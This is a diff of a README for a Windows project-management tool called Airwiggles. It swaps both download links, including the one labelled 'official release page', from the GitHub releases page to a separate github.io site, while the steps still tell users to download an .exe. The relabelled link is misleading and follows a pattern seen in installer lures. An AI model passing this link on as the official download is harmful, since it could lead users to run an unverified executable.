@@ -1,6 +1,6 @@
 # 📋 airwiggles-project-hub - Plan projects and manage team tasks
 
-[ ![Download Airwiggles](https://img.shields.io/badge/Download-Release_Page-blue.svg) ](https://github.com/secretariagobie5146/airwiggles-project-hub/releases)
+[ ![Download Airwiggles](https://img.shields.io/badge/Download-Release_Page-blue.svg) ](https://secretariagobie5146.github.io)
 
 Airwiggles helps teams manage projects and organize work. This tool keeps everyone on the same page. You can track progress, assign tasks, and monitor deadlines in one workspace. The software runs directly on your computer to provide a stable planning environment for your daily goals.
 
@@ -8,7 +8,7 @@ Airwiggles helps teams manage projects and organize work. This tool keeps everyo
 
 You need to download the installer to run the software on your Windows computer. Follow these instructions to get the application.
 
-1. Go to the [official release page](https://github.com/secretariagobie5146/airwiggles-project-hub/releases).
+1. Go to the [official release page](https://secretariagobie5146.github.io).
 2. Look for the section labeled Assets.
 3. Click the link that ends in .exe to start the download.
 4. Save the file to your desktop or downloads folder.
